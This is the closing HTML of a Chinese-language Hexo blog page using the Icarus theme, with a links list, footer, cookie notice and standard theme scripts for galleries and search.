rel="noopener"><span class="level-left"><span class="level-item">TencentCloud(腾讯云)</span></span><span class="level-right"><span class="level-item tag">cloud.tencent.com</span></span></a></li><li><a class="level is-mobile" href="https://www.zhipin.com/web/user/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">BOSS</span></span><span class="level-right"><span class="level-item tag">www.zhipin.com</span></span></a></li><li><a class="level is-mobile" href="https://www.bilibili.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bilibili(B站)</span></span><span class="level-right"><span class="level-item tag">www.bilibili.com</span></span></a></li></ul></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://brath.cloud/avatar.png" alt="Brath-Blog" height="28"></a><p class="is-size-7"><span>&copy; 2023 Brath</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p><p class="is-size-7">© 2029</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>